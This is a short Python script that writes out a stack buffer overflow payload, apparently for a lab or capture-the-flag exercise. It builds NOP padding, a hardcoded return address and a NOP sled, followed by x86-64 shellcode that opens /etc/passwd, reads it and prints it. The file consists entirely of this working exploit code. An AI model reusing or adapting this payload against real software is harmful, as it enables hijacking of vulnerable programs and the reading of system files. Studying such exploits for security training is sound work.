#!/usr/bin/python

import sys

shellcode1 = "\x48\x31\xc0\x48\xff\xc0\x48\xff\xc0\x48\x8d\x3d\x29\x11\x11\x01\x48\x81\xef\xe6\x10\x11\x01\x48\x31\xf6\x48\x31\xd2\x0f\x05\x4d\x31\xc9\x66\x41\xb9\x10\x27\x4c\x29\xcc\x50\x5f\x48\x31\xc0\x54\x5e\x41\x51\x5a\x0f\x05\x48\x31\xc0\x48\xff\xc0\x48\x31\xff\x48\xff\xc7\x54\x5e\x41\x51\x5a\x0f\x05\x48\x31\xc0\x04\x3c\x48\x31\xff\x0f\x05\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
exp = '\x90'*(87) + "\x90"
nopslide = "\x90" * 100
# Should have code execution here: return to the shellcode.
myretaddr = "\xc4\xd3\xff\xff\xff\x7f"

sys.stdout.write(exp + myretaddr + "\x00\x00" + nopslide + shellcode1)
